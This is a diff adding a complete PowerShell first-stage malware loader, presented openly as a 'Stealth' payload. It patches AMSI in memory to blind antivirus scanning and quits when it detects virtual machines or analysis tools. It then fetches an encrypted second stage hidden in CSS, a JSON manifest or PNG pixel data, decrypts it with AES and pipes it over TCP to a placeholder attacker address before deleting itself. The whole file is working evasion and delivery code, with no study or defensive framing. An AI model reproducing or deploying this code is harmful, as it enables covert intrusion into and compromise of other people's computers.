@@ -1,0 +1,120 @@
+# === Stage 1 PowerShell Payload — Stealth 2025 Anti-WDAC Edition ===
+
+# 🛡 AMSI Unhook (no AmsiUtils, no reflection)
+$src = @"
+using System;
+using System.Runtime.InteropServices;
+public class Bypass {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr h, string p);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string n);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
+}
+"@
+Add-Type $src
+$p = [Bypass]::GetProcAddress([Bypass]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
+[Bypass]::VirtualProtect($p, [uint32]5, 0x40, [ref]0) | Out-Null
+[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, $p, 1)  # Patch with RET
+
+# 🕵️ Anti-VM & Analysis
+try {
+    $m = (Get-WmiObject Win32_ComputerSystem).Manufacturer
+    $r = (Get-WmiObject Win32_OperatingSystem).TotalVisibleMemorySize
+    if ($m -match "VMware|VirtualBox|KVM|Xen") { exit }
+    if ($r -lt 4000000) { exit }
+    $susp = "vbox","wireshark","fiddler","sandboxie","ollydbg","procmon","ida","x96dbg"
+    $p = Get-Process | Select -Expand Name
+    foreach ($x in $susp) { if ($p -contains $x) { exit } }
+} catch {}
+
+# 📦 Download and extract encrypted payload
+$delivery = "REPLACE_DELIVERY"
+$url = "REPLACE_URL"
+$e = ""
+
+switch ($delivery) {
+    "css" {
+        $m = Invoke-WebRequest $url -UseBasicParsing
+        $match = [Regex]::Match($m.Content, 'content:\s*"([^"]+)"')
+        if ($match.Success) { $e = $match.Groups[1].Value } else { exit }
+    }
+    "manifest" {
+        $j = Invoke-RestMethod $url
+        if ($j.payload) { $e = $j.payload } else { exit }
+    }
+    "png" {
+        Add-Type -AssemblyName System.Drawing
+        $img = [System.Drawing.Image]::FromStream((Invoke-WebRequest $url).RawContentStream)
+        $img = New-Object System.Drawing.Bitmap $img
+        $bits = ""
+        for ($y=0; $y -lt $img.Height; $y++) {
+            for ($x=0; $x -lt $img.Width; $x++) {
+                $pix = $img.GetPixel($x, $y)
+                $bits += ($pix.R -band 1)
+                $bits += ($pix.G -band 1)
+                $bits += ($pix.B -band 1)
+            }
+        }
+        $bytes = @()
+        for ($i=0; $i -lt $bits.Length; $i+=8) {
+            $bytes += [Convert]::ToByte($bits.Substring($i,8),2)
+        }
+        $len = [BitConverter]::ToInt32($bytes, 0)
+        $payloadBytes = $bytes[4..(3+$len)]
+        $e = [System.Text.Encoding]::UTF8.GetString($payloadBytes)
+    }
+    default { exit }
+}
+
+# 🔐 AES Decryption
+$sp = $e -split ':'
+$iv = [byte[]]@()
+for ($i = 0; $i -lt $sp[0].Length; $i+=2) { $iv += [Convert]::ToByte($sp[0].Substring($i,2),16) }
+$cb = [Convert]::FromBase64String($sp[1])
+
+$aes = New-Object Security.Cryptography.AesManaged
+$aes.Mode = 'CBC'
+$aes.Padding = 'PKCS7'
+$aes.KeySize = 256
+$aes.BlockSize = 128
+$key = [Text.Encoding]::UTF8.GetBytes("REPLACE_KEY")
+$aes.Key = $key
+$aes.IV = $iv
+$dec = $aes.CreateDecryptor()
+$ms = New-Object IO.MemoryStream(,$cb)
+$cs = New-Object Security.Cryptography.CryptoStream($ms,$dec,'Read')
+$sr = New-Object IO.StreamReader($cs)
+$stage2 = $sr.ReadToEnd()
+
+# 💣 TCP shell wrapper via Add-Type (no TCPClient object visible)
+Add-Type @"
+using System;
+using System.Net.Sockets;
+using System.IO;
+using System.Text;
+public class RS {
+    public static void Run(string host, int port, string payload) {
+        TcpClient c = new TcpClient(host, port);
+        NetworkStream s = c.GetStream();
+        StreamWriter w = new StreamWriter(s);
+        w.AutoFlush = true;
+        w.Write("[+] Connected\\n");
+        StringReader r = new StringReader(payload);
+        string line;
+        while ((line = r.ReadLine()) != null) {
+            w.WriteLine(line);
+        }
+        w.Close(); c.Close();
+    }
+}
+"@
+
+# 🚀 Execute Stage 2 via TCP wrapper
+[RS]::Run("REPLACE_IP", REPLACE_PORT, $stage2)
+
+# 🧹 Self-delete
+try {
+    Remove-Item $MyInvocation.MyCommand.Path -Force
+} catch {}
